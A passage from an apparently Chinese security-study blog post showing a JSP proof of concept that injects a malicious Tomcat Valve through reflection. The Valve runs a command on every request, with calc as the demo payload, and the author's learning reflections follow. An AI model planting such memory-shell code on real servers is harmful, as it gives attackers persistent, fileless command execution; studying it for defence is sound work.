    //首先获取context,往context的管道中添加恶意Valve

    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);

    Request request1 =(Request) requestField.get(request);
    StandardContext context =(StandardContext) request1.getContext();
    //    StandardHost standardHost = (StandardHost) request1.getHost();
    //    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();
    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
    pipelineField.setAccessible(true);
    StandardPipeline standardPipeline= (StandardPipeline) pipelineField.get(context);
    //   StandardPipeline standardPipeline2 = (StandardPipeline) pipelineField.get(standardHost);
    //   StandardPipeline standardPipeline3 = (StandardPipeline) pipelineField.get(standardWrapper);

    ValveBase valveBase = new ValveBase(){

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            Runtime.getRuntime().exec("calc");
        }
    };
    standardPipeline.addValve(valveBase);
    
%>
```

> 参考引用
>
> https://blog.csdn.net/Xxy605/article/details/124120724

### 总结

花了不少时间看大佬的文章,才算将整个流程调试着跟下来并有了浅显的理解,如果不看大佬的分析,估计连有点地方入口在哪都找不到

期间也感受到了基础知识对于看代码是有多么重要,就getClass这一点过去总是误解为它获取的都是当前类的class,还有就是英语也很重要,有时候点进去看个源码的注释,还是得靠英语

加油吧!
